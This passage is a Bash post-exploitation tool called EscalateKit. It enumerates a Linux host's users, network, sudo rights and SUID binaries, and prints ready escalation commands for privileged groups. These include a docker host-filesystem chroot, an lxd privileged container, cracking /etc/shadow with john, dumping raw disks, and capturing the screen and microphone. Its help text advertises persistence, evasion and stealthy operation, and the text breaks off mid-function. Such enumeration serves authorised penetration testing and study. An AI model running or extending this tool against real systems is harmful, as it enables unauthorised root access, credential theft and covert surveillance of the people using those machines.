#!/bin/bash
# EscalateKit: Post-Exploitation Automation Tool
# A comprehensive tool for privilege escalation and system reconnaissance
# Version: 1.0

# ----------------------------------------------------------------------
# Global Variables
# ----------------------------------------------------------------------
PROGRAM_NAME=$(basename "$0")
VERSION="1.0"
LOG_DIR="/tmp/.escalatekit_logs"
DEFAULT_OUTPUT_DIR="/tmp/.escalatekit_results"
OUTPUT_DIR="$DEFAULT_OUTPUT_DIR"
LOGFILE="$LOG_DIR/history.log"
VERBOSE=false
PARALLEL_MODE=""
EXPORT_FORMAT=""
MODULES_TO_RUN="all"
QUIET_MODE=false
TARGET_DIR=""
GTFOBINS_DATA="/tmp/.gtfobins_data"

# ----------------------------------------------------------------------
# Error Codes
# ----------------------------------------------------------------------
E_SUCCESS=0
E_OPTION_NOT_EXIST=100
E_MISSING_PARAM=101
E_PERMISSION_DENIED=102
E_DIR_NOT_EXIST=103
E_FILE_NOT_EXIST=104
E_INVALID_FORMAT=105
E_MODULE_FAILED=106
E_CONNECTION_FAILED=107

# ----------------------------------------------------------------------
# Utility Functions
# ----------------------------------------------------------------------

check_current_privileges() {
    local current_user=$(whoami)
    local current_uid=$(id -u)
    
    if [ "$QUIET_MODE" = false ]; then
        echo -e "\e[33m[*] Current User Context:\e[0m"
        echo -e "    User: $current_user"
        echo -e "    UID: $current_uid"
        
        if [ "$current_uid" -eq 0 ]; then
            echo -e "\e[31m[!] Already running as root - privilege escalation not needed\e[0m"
            echo -e "    This tool is designed for escalating FROM unprivileged users TO root"
        else
            echo -e "\e[32m[+] Running as unprivileged user - perfect for privilege escalation\e[0m"
        fi
        echo ""
    fi
    
    # Log the current context
    log_message "INFOS" "Starting EscalateKit as user: $current_user (UID: $current_uid)"
}


check_current_privileges


# Function to monitor system resources in background
monitor_resources() {
    local output_file="$OUTPUT_DIR/monitor_resources.txt"

    # Start monitoring in background
    (
        echo "=== Resource Monitoring Started at $(date) ===" >"$output_file"

        while true; do
            echo -e "\n--- $(date) ---" >>"$output_file"
            echo "CPU Usage:" >>"$output_file"
            top -bn1 | head -n 20 >>"$output_file"

            echo -e "\nDisk Usage:" >>"$output_file"
            df -h >>"$output_file"

            echo -e "\nMemory Usage:" >>"$output_file"
            free -m >>"$output_file"

            sleep 10
        done
    ) &

    # Store the monitoring PID
    MONITOR_PID=$!

    # Register a trap to kill the monitoring when the script exits
    trap "kill $MONITOR_PID 2>/dev/null" EXIT
}

# Function to run a command with timeout detection
run_with_timeout() {
    local cmd="$1"
    local timeout="$2"
    local operation="$3"
    local expected_time="$4"

    # Start time
    local start_time=$(date +%s)

    # Run the command
    eval "$cmd" &
    local pid=$!

    # Wait for command to finish or timeout
    local counter=0
    while kill -0 $pid 2>/dev/null; do
        sleep 1
        counter=$((counter + 1))

        # Check if we've exceeded the expected time
        if [ $counter -gt $expected_time ] && [ $counter -lt $timeout ] && [ $((counter % 10)) -eq 0 ]; then
            if [ "$QUIET_MODE" = false ]; then
                echo -e "\e[33m[!]\e[0m $operation is taking longer than expected. Still working..."
            fi
        fi

        # Check if we've timed out
        if [ $counter -ge $timeout ]; then
            kill -9 $pid 2>/dev/null
            if [ "$QUIET_MODE" = false ]; then
                echo -e "\e[31m[ERROR]\e[0m $operation timed out after $timeout seconds. Something may be wrong."
                echo -e "    Consider checking system resources or connection issues."
            fi
            return 1
        fi
    done

    # End time
    local end_time=$(date +%s)
    local duration=$((end_time - start_time))

    # Check if the command completed successfully
    wait $pid
    local exit_code=$?

    if [ $exit_code -ne 0 ]; then
        if [ "$QUIET_MODE" = false ]; then
            echo -e "\e[31m[ERROR]\e[0m $operation failed with exit code $exit_code."
        fi
        return $exit_code
    fi

    return 0
}

# Function to display a warning for long operations
long_operation_warning() {
    local operation="$1"

    if [ "$QUIET_MODE" = false ]; then
        echo -e "\e[33m[!]\e[0m The $operation may take some time to complete. Don't panic - this is normal."
        echo -e "    Grab a coffee while EscalateKit works its magic..."
    fi
}

# Function to display a loading animation
# Function to display a loading animation
show_loading() {
    local pid=$1
    local message=$2
    local i=0
    local spinner=('⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏')
    local warning_shown=false
    
    # Only show animation if not in quiet mode
    if [ "$QUIET_MODE" = false ]; then
        # Save cursor position
        tput sc
        
        while kill -0 $pid 2>/dev/null; do
            local spin_char="${spinner[$i]}"
            
            # Restore cursor position
            tput rc
            # Clear line
            tput el
            
            # Print spinner and message
            echo -ne "\e[36m$spin_char\e[0m $message..."
            
            # Show warning message for long-running tasks after a delay
            if [ "$warning_shown" = false ] && [[ "$message" == *"SUID"* || "$message" == *"writable files"* ]]; then
                # Wait 3 seconds before showing the warning
                sleep 3
                if kill -0 $pid 2>/dev/null; then
                    # Still running after 3 seconds, show the warning
                    warning_shown=true
                    
                    # Move to new line to avoid overlapping
                    echo ""  # New line
                    echo -e "[!] The $message may take some time to complete. Don't panic - this is normal."
                    echo -e "    Grab a coffee while EscalateKit works its magic..."
                    
                    # Save new cursor position
                    tput sc
                fi
            else
                sleep 0.1
            fi
            
            i=$(( (i+1) % ${#spinner[@]} ))
        done
        
        # Restore cursor position and clear line
        tput rc
        tput el
        
        # Only show completion message if not requested to skip
        if [ -z "$SKIP_COMPLETION_MESSAGE" ]; then
            # Print completion message
            echo -e "\e[32m✓\e[0m $message... Done"
        else
            # Reset the variable for future calls
            unset SKIP_COMPLETION_MESSAGE
        fi
    fi
}

# Enhanced loading function with progress
show_loading_with_progress() {
    local pid=$1
    local message=$2
    local total_items=$3
    local progress_file=$4
    local i=0
    local spinner=('⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏')

    # Only show animation if not in quiet mode
    if [ "$QUIET_MODE" = false ]; then
        # Create progress file if it doesn't exist
        if [ ! -f "$progress_file" ]; then
            echo "0" >"$progress_file"
        fi

        # Save cursor position
        tput sc

        while kill -0 $pid 2>/dev/null; do
            local spin_char="${spinner[$i]}"

            # Read current progress
            local current=$(cat "$progress_file" 2>/dev/null || echo "0")
            local percent=0

            if [ $total_items -gt 0 ]; then
                percent=$(((current * 100) / total_items))
            fi

            # Restore cursor position and clear line
            tput rc
            tput el

            # Print spinner, message and progress
            if [ $total_items -gt 0 ]; then
                echo -ne "\e[36m$spin_char\e[0m $message... \e[32m$percent%\e[0m ($current/$total_items)"
            else
                echo -ne "\e[36m$spin_char\e[0m $message..."
            fi

            i=$(((i + 1) % ${#spinner[@]}))
            sleep 0.1
        done

        # Restore cursor position and clear line
        tput rc
        tput el

        # Print completion message
        echo -e "\e[32m✓\e[0m $message... Done"

        # Clean up
        rm -f "$progress_file"
    fi
}

# Function to log messages to both console and log file
log_message() {
    local level="$1"
    local message="$2"
    local timestamp
    timestamp=$(date +"%Y-%m-%d-%H-%M-%S")
    local username
    username=$(whoami)

    # Create the log directory if it doesn't exist
    if [ ! -d "$LOG_DIR" ]; then
        mkdir -p "$LOG_DIR" 2>/dev/null
        if [ $? -ne 0 ]; then
            echo "Cannot create log directory: $LOG_DIR" >&2
            return 1
        fi
    fi

    # Log to file
    echo "$timestamp : $username : $level : $message" >>"$LOGFILE"

    # Display to console if not in quiet mode - with improved formatting
    if [ "$QUIET_MODE" = false ]; then
        if [ "$level" = "ERROR" ]; then
            echo -e "\e[31m[ERROR]\e[0m $message" >&2 # Red for errors
        elif [ "$level" = "WARN" ]; then
            echo -e "\e[33m[WARN]\e[0m $message" # Yellow for warnings
        elif [ "$level" = "INFOS" ]; then
            if [ "$VERBOSE" = true ]; then
                echo -e "\e[32m[INFO]\e[0m $message" # Green for info
            fi
        else
            # For normal output, just print the message
            echo "$message"
        fi
    fi
}
# Function to display help
display_help() {
    cat <<EOF
NAME
    $PROGRAM_NAME - Post-Exploitation Automation Tool

SYNOPSIS
    $PROGRAM_NAME [OPTIONS] [DIRECTORY]

DESCRIPTION
    A comprehensive tool for privilege escalation, system reconnaissance,
    and post-exploitation activities on Linux systems. Helps identify 
    potential privilege escalation vectors and establish persistence.

OPTIONS
    -h, --help          Display this help message and exit
    -f, --fork          Execute modules using fork processes for parallel execution
    -t, --thread        Execute modules using threads for parallel execution
    -s, --subshell      Execute modules in a subshell (isolated environment)
    -l, --log DIR       Specify a custom directory for log files
    -r, --restore       Clean up artifacts and restore altered configurations
    -v, --verbose       Enable verbose output mode
    -m, --modules LIST  Specify modules to run (shell,recon,exploit,persist,evade)
    -o, --output FORMAT Export results in specified format (json,html,csv)
    -q, --quiet         Minimal output for stealthy operation

MODULES
    shell   - Upgrades and stabilizes the current shell
    recon   - Gathers system information for privilege escalation
    exploit - Suggests and provides templates for exploitation
    persist - Establishes persistence mechanisms
    evade   - Implements evasion techniques

EXAMPLES
    $PROGRAM_NAME -h
        Display help message

    $PROGRAM_NAME -t -m recon
        Run reconnaissance module using threads with default output

    $PROGRAM_NAME -f -l /tmp/.hidden -m shell,exploit
        Run shell and exploit modules using fork with hidden log directory

    $PROGRAM_NAME -s -m persist -q
        Run persistence module in a subshell with minimal output

EXIT CODES
    0   Success
    100 Option not found
    101 Missing required parameter
    102 Permission denied
    103 Directory does not exist
    104 File does not exist
    105 Invalid format
    106 Module execution failed
    107 Connection failed

AUTHOR
    K4YR0

COPYRIGHT
    Copyright © 2025 K4YR0. All rights reserved.
EOF
}

# ----------------------------------------------------------------------
# Shell Enhancement Module
# ----------------------------------------------------------------------

shell_upgrade() {
    log_message "INFOS" "Starting shell upgrade module"

    mkdir -p "$OUTPUT_DIR/shell"
    local output_file="$OUTPUT_DIR/shell/upgrade_options.txt"

    # Check available interpreters
    echo "--- Available Shell Upgrade Methods ---" >"$output_file"

    # Python TTY
    if command -v python >/dev/null 2>&1 || command -v python3 >/dev/null 2>&1; then
        echo "[+] Python TTY Upgrade Available:" >>"$output_file"
        if command -v python >/dev/null 2>&1; then
            echo "    python -c 'import pty; pty.spawn(\"/bin/bash\")'" >>"$output_file"
        fi
        if command -v python3 >/dev/null 2>&1; then
            echo "    python3 -c 'import pty; pty.spawn(\"/bin/bash\")'" >>"$output_file"
        fi
    fi

    # Perl TTY
    if command -v perl >/dev/null 2>&1; then
        echo "[+] Perl TTY Upgrade Available:" >>"$output_file"
        echo "    perl -e 'exec \"/bin/bash\";'" >>"$output_file"
    fi

    # Ruby TTY
    if command -v ruby >/dev/null 2>&1; then
        echo "[+] Ruby TTY Upgrade Available:" >>"$output_file"
        echo "    ruby -e 'exec \"/bin/bash\"'" >>"$output_file"
    fi

    # Full TTY Stabilization Steps
    echo -e "\n--- Full TTY Stabilization ---" >>"$output_file"
    echo "After running the above commands, execute these steps:" >>"$output_file"
    echo "1. ^Z (background the shell)" >>"$output_file"
    echo "2. stty raw -echo; fg" >>"$output_file"
    echo "3. reset" >>"$output_file"
    echo "4. export TERM=xterm" >>"$output_file"
    echo "5. stty rows 38 columns 116" >>"$output_file"

    log_message "INFOS" "Shell upgrade options saved to $output_file"

    # Offer to attempt automatic upgrade if not in quiet mode
    if [ "$QUIET_MODE" = false ]; then
        echo -e "\n[*] Shell Upgrade Options:"
        cat "$output_file"

        echo -e "\n[?] Would you like to attempt an automatic shell upgrade? (y/n)"
        read -r response
        if [[ "$response" =~ ^[Yy]$ ]]; then
            echo "[*] Attempting Python TTY upgrade..."
            if command -v python3 >/dev/null 2>&1; then
                python3 -c 'import pty; pty.spawn("/bin/bash")'
            elif command -v python >/dev/null 2>&1; then
                python -c 'import pty; pty.spawn("/bin/bash")'
            elif command -v perl >/dev/null 2>&1; then
                perl -e 'exec "/bin/bash";'
            else
                echo "[-] No suitable interpreters found for automatic upgrade."
            fi
        fi
    fi

    return 0
}

# ----------------------------------------------------------------------
# Reconnaissance Module
# ----------------------------------------------------------------------

recon_system_info() {
    log_message "INFOS" "Gathering basic system information"

    mkdir -p "$OUTPUT_DIR/recon"
    local output_file="$OUTPUT_DIR/recon/system_info.txt"

    # System information
    echo "--- System Information ---" >"$output_file"
    echo "Hostname: $(hostname 2>/dev/null)" >>"$output_file"
    echo "Kernel: $(uname -a 2>/dev/null)" >>"$output_file"
    echo "OS: $(cat /etc/issue 2>/dev/null | head -n 1 | awk '{print $1,$2,$3}')" >>"$output_file"

    # Current user context
    echo -e "\n--- User Context ---" >>"$output_file"
    echo "Current User: $(whoami 2>/dev/null)" >>"$output_file"
    echo "Current ID: $(id 2>/dev/null)" >>"$output_file"
    echo "Login Shell: $SHELL" >>"$output_file"

    # List all users
    echo -e "\n--- All Users ---" >>"$output_file"
    cat /etc/passwd | cut -d: -f1 2>/dev/null >>"$output_file"

    # Mounted filesystems
    echo -e "\n--- Mounted Filesystems ---" >>"$output_file"
    mount 2>/dev/null >>"$output_file"

    log_message "INFOS" "Basic system information saved to $output_file"
    return 0
}

recon_network() {
    log_message "INFOS" "Gathering network information"

    mkdir -p "$OUTPUT_DIR/recon"
    local output_file="$OUTPUT_DIR/recon/network_info.txt"

    # Network interfaces
    echo "--- Network Interfaces ---" >"$output_file"
    ip a 2>/dev/null >>"$output_file" || ifconfig 2>/dev/null >>"$output_file"

    # Network connections
    echo -e "\n--- Network Connections ---" >>"$output_file"
    netstat -tuln 2>/dev/null >>"$output_file" || ss -tuln 2>/dev/null >>"$output_file"

    # ARP table - Enhanced detection
    echo -e "\n--- ARP Table ---" >>"$output_file"
    {
        ip neigh show 2>/dev/null ||    # Modern Linux
        arp -a 2>/dev/null ||          # BSD-style (macOS, older Linux)
        arp -n 2>/dev/null ||          # Traditional Linux
        cat /proc/net/arp 2>/dev/null  # Raw ARP table
    } >>"$output_file"

    # Routing table
    echo -e "\n--- Routing Table ---" >>"$output_file"
    route -n 2>/dev/null >>"$output_file" || ip route 2>/dev/null >>"$output_file"

    # Firewall rules
    echo -e "\n--- Firewall Rules ---" >>"$output_file"
    if command -v iptables >/dev/null 2>&1; then
        iptables -L 2>/dev/null >>"$output_file"
    elif command -v ufw >/dev/null 2>&1; then
        ufw status 2>/dev/null >>"$output_file"
    fi

    # Outbound connectivity test
    echo -e "\n--- Outbound Connectivity ---" >>"$output_file"
    ping -c 1 8.8.8.8 >/dev/null 2>&1
    if [ $? -eq 0 ]; then
        echo "[+] Outbound ICMP traffic is allowed" >>"$output_file"
    else
        echo "[-] Outbound ICMP traffic might be blocked" >>"$output_file"
    fi

    log_message "INFOS" "Network information saved to $output_file"
    return 0
}

recon_sudo_privileges() {
    log_message "INFOS" "Checking for sudo privileges"
    
    mkdir -p "$OUTPUT_DIR/recon"
    local output_file="$OUTPUT_DIR/recon/sudo_privs.txt"
    
    echo "--- Sudo Privileges Check ---" > "$output_file"
    echo "Generated on: $(date)" >> "$output_file"
    echo "User: $(whoami)" >> "$output_file"
    echo "Hostname: $(hostname)" >> "$output_file"
    echo -e "\n" >> "$output_file"

    # Check sudo command exists
    if ! command -v sudo &> /dev/null; then
        echo "[-] sudo command not found" >> "$output_file"
        log_message "WARN" "sudo command not found"
        return 1
    fi

    # Check sudo privileges
    echo "--- Sudo Access Check ---" >> "$output_file"
    
    if sudo -n true 2>/dev/null; then
        echo "[+] Passwordless sudo access available" >> "$output_file"
        sudo_output=$(sudo -l 2>/dev/null)
        echo "--- Raw sudo -l output ---" >> "$output_file"
        echo "$sudo_output" >> "$output_file"
        echo "--- End of raw output ---" >> "$output_file"
        
        # Check for GTFOBins matches
        echo -e "\n--- Potential Privilege Escalation via Sudo ---" >> "$output_file"
        
        # Check for the specific "(ALL : ALL) ALL" case first
        if echo "$sudo_output" | grep -q "(ALL : ALL) ALL\|(ALL) ALL"; then
            echo "[!] CRITICAL: User has full sudo access - (ALL : ALL) ALL" >> "$output_file"
            echo "    This means the user can run ANY command as root with sudo" >> "$output_file"
            echo "    Simply run: sudo su -" >> "$output_file"
            echo "    Or: sudo /bin/bash" >> "$output_file"
            echo "    Or: sudo -i" >> "$output_file"
            echo "" >> "$output_file"
        fi
        
        # Parse sudo -l output line by line with improved parsing
        echo "$sudo_output" | while IFS= read -r line; do
            # Skip empty lines and headers
            if [[ -z "$line" || "$line" =~ ^[[:space:]]*$ ]]; then
                continue
            fi
            
            if [[ "$line" =~ ^"Matching Defaults entries" ]]; then
                continue
            fi
            
            if [[ "$line" =~ ^"User $(whoami) may run" ]]; then
                continue
            fi
            
            # Check for (ALL : ALL) ALL pattern
            if [[ "$line" =~ \(ALL[[:space:]]*:[[:space:]]*ALL\)[[:space:]]+ALL ]]; then
                echo "[!] CRITICAL: Full sudo access found on line: $line" >> "$output_file"
                continue
            fi
            
            # Look for lines containing executable paths
            if [[ "$line" =~ \(.*\)[[:space:]]+/.* ]]; then
                echo "$line" | grep -oE '/[^[:space:],()]+' | while read -r binary_path; do
                    if [[ -n "$binary_path" && "$binary_path" =~ ^/ ]]; then
                        binary_name=$(basename "$binary_path")
                        echo "[*] Found sudo permission for: $binary_path" >> "$output_file"
                        check_gtfobins "$binary_name" "sudo" >> "$output_file"
                        echo "" >> "$output_file"
                    fi
                done
            elif [[ "$line" =~ ^[[:space:]]+/.* ]]; then
                echo "$line" | grep -oE '/[^[:space:],()]+' | while read -r binary_path; do
                    if [[ -n "$binary_path" && "$binary_path" =~ ^/ ]]; then
                        binary_name=$(basename "$binary_path")
                        echo "[*] Found sudo permission for: $binary_path" >> "$output_file"
                        check_gtfobins "$binary_name" "sudo" >> "$output_file"
                        echo "" >> "$output_file"
                    fi
                done
            elif [[ "$line" =~ \(.*\)[[:space:]]+[^/] ]]; then
                # Extract commands that don't start with /
                commands=$(echo "$line" | sed 's/^[^)]*)[[:space:]]*//' | tr ',' '\n')
                echo "$commands" | while read -r cmd; do
                    cmd=$(echo "$cmd" | xargs)  # trim whitespace
                    if [[ -n "$cmd" && "$cmd" != "ALL" ]]; then
                        echo "[*] Found sudo permission for command: $cmd" >> "$output_file"
                        # Try to get just the binary name
                        binary_name=$(echo "$cmd" | awk '{print $1}')
                        if [[ -n "$binary_name" ]]; then
                            check_gtfobins "$binary_name" "sudo" >> "$output_file"
                        fi
                        echo "" >> "$output_file"
                    fi
                done
            fi
        done
        
        # Additional check for common dangerous sudo permissions
        echo -e "\n--- Common Dangerous Sudo Permissions ---" >> "$output_file"
        dangerous_binaries=("vi" "vim" "nano" "emacs" "less" "more" "man" "awk" "find" "nmap" "python" "python3" "perl" "ruby" "bash" "sh" "nc" "netcat" "socat" "wget" "curl" "tar" "zip" "unzip" "git" "ftp" "ssh" "scp" "rsync" "mount" "umount" "chmod" "chown" "cp" "mv" "dd" "systemctl" "service" "su")
        
        for binary in "${dangerous_binaries[@]}"; do
            if echo "$sudo_output" | grep -q "/$binary\|[[:space:]]$binary[[:space:]]\|[[:space:]]$binary$\|^$binary[[:space:]]\|^$binary$"; then
                echo "[!] CRITICAL: Found sudo access to $binary" >> "$output_file"
                check_gtfobins "$binary" "sudo" >> "$output_file"
                echo "" >> "$output_file"
            fi
        done
        
    else
        echo "[!] sudo requires password" >> "$output_file"
        
        # Only prompt for password if not in quiet mode
        if [ "$QUIET_MODE" = false ]; then
            read -p "Do you know the current user's password? (y/n): " know_password
        else
            know_password="n"
        fi
        
        if [[ "$know_password" =~ ^[Yy]$ ]]; then
            echo "[*] Attempting 'sudo -l' with password..." >> "$output_file"
            sudo_output=$(sudo -l 2>/dev/null)
            
            if [ $? -eq 0 ]; then
                echo "--- Raw sudo -l output (with password) ---" >> "$output_file"
                echo "$sudo_output" >> "$output_file"
                echo "--- End of raw output ---" >> "$output_file"
                
                echo -e "\n--- Potential Privilege Escalation via Sudo ---" >> "$output_file"
                
                # Check for (ALL : ALL) ALL case
                if echo "$sudo_output" | grep -q "(ALL : ALL) ALL\|(ALL) ALL"; then
                    echo "[!] CRITICAL: User has full sudo access - (ALL : ALL) ALL" >> "$output_file"
                    echo "    This means the user can run ANY command as root with sudo" >> "$output_file"
                    echo "    Simply run: sudo su -" >> "$output_file"
                    echo "" >> "$output_file"
                fi
                
                # Same parsing logic as above for password-protected sudo
                echo "$sudo_output" | while IFS= read -r line; do
                    [[ -z "$line" || "$line" =~ ^[[:space:]]*$ ]] && continue
                    [[ "$line" =~ ^"Matching Defaults entries" ]] && continue
                    [[ "$line" =~ ^"User $(whoami) may run" ]] && continue
                    
                    if [[ "$line" =~ \(.*\)[[:space:]]+/.* ]]; then
                        echo "$line" | grep -oE '/[^[:space:],()]+' | while read -r binary_path; do
                            if [[ -n "$binary_path" && "$binary_path" =~ ^/ ]]; then
                                binary_name=$(basename "$binary_path")
                                echo "[*] Found sudo permission for: $binary_path" >> "$output_file"
                                check_gtfobins "$binary_name" "sudo" >> "$output_file"
                                echo "" >> "$output_file"
                            fi
                        done
                    elif [[ "$line" =~ ^[[:space:]]+/.* ]]; then
                        echo "$line" | grep -oE '/[^[:space:],()]+' | while read -r binary_path; do
                            if [[ -n "$binary_path" && "$binary_path" =~ ^/ ]]; then
                                binary_name=$(basename "$binary_path")
                                echo "[*] Found sudo permission for: $binary_path" >> "$output_file"
                                check_gtfobins "$binary_name" "sudo" >> "$output_file"
                                echo "" >> "$output_file"
                            fi
                        done
                    fi
                done
            else
                echo "[-] Failed to check sudo privileges (incorrect password)" >> "$output_file"
            fi
        else
            echo "[-] Cannot check sudo privileges without password" >> "$output_file"
        fi
    fi

    # Enhanced group checks with comprehensive analysis
    echo -e "\n--- User Group Memberships ---" >> "$output_file"
    current_groups=$(groups)
    echo "Current groups: $current_groups" >> "$output_file"
    
    echo -e "\n--- Privileged Group Analysis ---" >> "$output_file"
    privileged_groups=("sudo" "wheel" "admin" "adm" "docker" "lxd" "disk" "video" "audio" "shadow" "root" "lpadmin" "sambashare" "plugdev" "netdev" "kvm" "libvirt")
    
    for group in "${privileged_groups[@]}"; do
        if echo "$current_groups" | grep -qw "$group"; then
            echo "[+] Member of $group group - Potential escalation:" >> "$output_file"
            
            case $group in
                "docker")
                    echo "  Command: docker run -v /:/mnt --rm -it alpine chroot /mnt sh" >> "$output_file"
                    echo "  Reference: https://gtfobins.github.io/gtfobins/docker/" >> "$output_file"
                    echo "  Explanation: Docker group members can mount host filesystem and escape container" >> "$output_file"
                    ;;
                "lxd")
                    echo "  Commands:" >> "$output_file"
                    echo "    lxc init ubuntu:18.04 test -c security.privileged=true" >> "$output_file"
                    echo "    lxc config device add test rootdisk disk source=/ path=/mnt/root recursive=true" >> "$output_file"
                    echo "    lxc start test && lxc exec test /bin/bash" >> "$output_file"
                    echo "  Reference: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation" >> "$output_file"
                    echo "  Explanation: LXD group members can create privileged containers" >> "$output_file"
                    ;;
                "disk")
                    echo "  Commands:" >> "$output_file"
                    echo "    debugfs /dev/sda1" >> "$output_file"
                    echo "    dd if=/dev/sda of=/tmp/disk.img" >> "$output_file"
                    echo "  Reference: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#disk-group" >> "$output_file"
                    echo "  Explanation: Direct access to disk devices, can read entire filesystem" >> "$output_file"
                    ;;
                "shadow")
                    echo "  Commands:" >> "$output_file"
                    echo "    cat /etc/shadow" >> "$output_file"
                    echo "    john --wordlist=/usr/share/wordlists/rockyou.txt /etc/shadow" >> "$output_file"
                    echo "  Reference: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#shadow-group" >> "$output_file"
                    echo "  Explanation: Can read /etc/shadow file containing password hashes" >> "$output_file"
                    ;;
                "video")
                    echo "  Commands:" >> "$output_file"
                    echo "    cat /dev/fb0 > /tmp/screen.raw" >> "$output_file"
                    echo "    ffmpeg -f fbdev -i /dev/fb0 screenshot.png" >> "$output_file"
                    echo "  Reference: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#video-group" >> "$output_file"
                    echo "  Explanation: Access to framebuffer devices, can capture screen content" >> "$output_file"
                    ;;
                "audio")
                    echo "  Commands:" >> "$output_file"
                    echo "    arecord -f cd -t wav /tmp/audio.wav" >> "$output_file"
                    echo "    cat /dev/snd/* > /tmp/audio.raw" >> "$output_file"
                    echo "  Reference: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#audio-group" >> "$output_file"
                    echo "  Explanation: Access to audio devices, can record microphone input" >> "$output_file"
                    ;;
                "adm")
                    echo "  Commands:" >> "$output_file"
                    echo "    find /var/log -readable 2>/dev/null | head -20" >> "$output_file"
                    echo "    grep -r 'password\\|pass\\|pwd' /var/log/ 2>/dev/null" >> "$output_file"
                    echo "  Reference: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#adm-group" >> "$output_file"
                    echo "  Explanation: Read access to system logs, may contain sensitive information" >> "$output_file"
                    ;;
                "root")
                    echo "  Commands:" >> "$output_file"
                    echo "    find / -group root -perm -g=w ! -type l -exec ls -ld {} + 2>/dev/null" >> "$output_file"
                    echo "    find /etc -group root -writable 2>/dev/null" >> "$output_file"
                    echo "  Reference: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe" >> "$output_file"
                    echo "  Explanation: Check for group-writable files owned by root" >> "$output_file"
                    ;;
                "kvm"|"libvirt")
                    echo "  Commands:" >> "$output_file"
                    echo "    virsh list --all" >> "$output_file"
                    echo "    virsh edit [vm-name]" >> "$output_file"
                    echo "  Reference: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#libvirt-group" >> "$output_file"
                    echo "  Explanation: Control virtual machines, potential for VM escape" >> "$output_file"
                    ;;
                "lpadmin")
                    echo "  Commands:" >> "$output_file"
                    echo "    cupsctl" >> "$output_file"
                    echo "    lpstat -a" >> "$output_file"
                    echo "  Reference: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#lpadmin-group" >> "$output_file"
                    echo "  Explanation: Printer administration, potential for command injection via print jobs" >> "$output_file"
                    ;;
                "sambashare")
                    echo "  Commands:" >> "$output_file"
                    echo "    smbclient -L localhost" >> "$output_file"
                    echo "    testparm" >> "$output_file"
                    echo "  Reference: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe" >> "$output_file"
                    echo "  Explanation: Samba share access, check for writable shares or config files" >> "$output_file"
                    ;;
                "plugdev")
                    echo "  Commands:" >> "$output_file"
                    echo "    lsblk" >> "$output_file"
                    echo "    mount /dev/sd* /mnt" >> "$output_file"
                    echo "  Reference: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#plugdev-group" >> "$output_file"
                    echo "  Explanation: Mount removable devices, potential access to external storage" >> "$output_file"
                    ;;
                "netdev")
                    echo "  Commands:" >> "$output_file"
                    echo "    ip link show" >> "$output_file"
                    echo "    iwconfig" >> "$output_file"
                    echo "  Reference: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe" >> "$output_file"
                    echo "  Explanation: Network device configuration, potential for network manipulation" >> "$output_file"
                    ;;
                *)
                    echo "  General admin privileges - investigate further" >> "$output_file"
                    echo "  Check sudo -l for specific commands" >> "$output_file"
                    echo "  Reference: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe" >> "$output_file"
                    ;;
            esac
            echo "" >> "$output_file"
        fi
    done
    
    log_message "INFOS" "Sudo privileges check saved to $output_file"
    return 0
}


recon_suid_files() {
    log_message "INFOS" "Searching for SUID files"
    
    mkdir -p "$OUTPUT_DIR/recon"
    local output_file="$OUTPUT_DIR/recon/suid_files.txt"
    
    echo "--- SUID Files ---" > "$output_file"
    
    # Display warning about long operation
    if [ "$QUIET_MODE" = false ]; then
        echo -e "[!] The SUID file search may take some time to complete. Don't panic - this is normal."
        echo -e "    Grab a coffee while EscalateKit works its magic..."
    fi
    
    echo "[*] Searching for SUID files (this may take a while)..." >> "$output_file"
    echo "[*] Note: Running as non-root user, some directories may not be accessible" >> "$output_file"
    
    # Search for SUID files with better error handling
    echo "[*] Starting SUID file search..." >> "$output_file"
    find / -type f -perm -4000 2>/dev/null > "/tmp/.suid_files.tmp"
    
    # Count found files
    suid_count=$(wc -l < "/tmp/.suid_files.tmp" 2>/dev/null || echo "0")
    echo "[*] Found $suid_count SUID files" >> "$output_file"
    
    # Check if we found any SUID files
    if [ -s "/tmp/.suid_files.tmp" ] && [ "$suid_count" -gt 0 ]; then
        echo -e "\n--- SUID Files List ---" >> "$output_file"
        # Get detailed info about each SUID file
        while read -r suid_file; do
            if [ -f "$suid_file" ]; then
                ls -la "$suid_file" 2>/dev/null >> "$output_file"
            fi
        done < "/tmp/.suid_files.tmp"
        
        # Extract binary names and check against GTFOBins
        echo -e "\n--- GTFOBins SUID Matches ---" >> "$output_file"
        found_exploitable=false
        while read -r suid_file; do
            if [ -f "$suid_file" ]; then
                binary_name=$(basename "$suid_file")
                if check_gtfobins "$binary_name" "suid" >> "$output_file"; then
                    found_exploitable=true
                fi
            fi
        done < "/tmp/.suid_files.tmp"
        
        if [ "$found_exploitable" = false ]; then
            echo "[-] No exploitable SUID binaries found in GTFOBins database" >> "$output_file"
            echo "    Tip: Check GTFOBins.github.io manually for less common binaries" >> "$output_file"
        fi
    else
        echo "[-] No SUID files found (or permission denied to all directories)" >> "$output_file"
        echo "    This is unusual - most Linux systems have some SUID binaries" >> "$output_file"
        echo "    Possible reasons:" >> "$output_file"
        echo "    - Very restrictive filesystem permissions" >> "$output_file"
        echo "    - Container environment with minimal binaries" >> "$output_file"
        echo "    - Custom security configuration" >> "$output_file"
    fi
    
    # Clean up
    rm -f "/tmp/.suid_files.tmp"
    
    if [ "$QUIET_MODE" = false ]; then
        echo -e "\e[32m✓\e[0m Searching for SUID files... Done"
    fi
    
    log_message "INFOS" "SUID files check saved to $output_file"
    return 0
}

recon_capabilities() {
    log_message "INFOS" "Checking for capabilities"

    mkdir -p "$OUTPUT_DIR/recon"
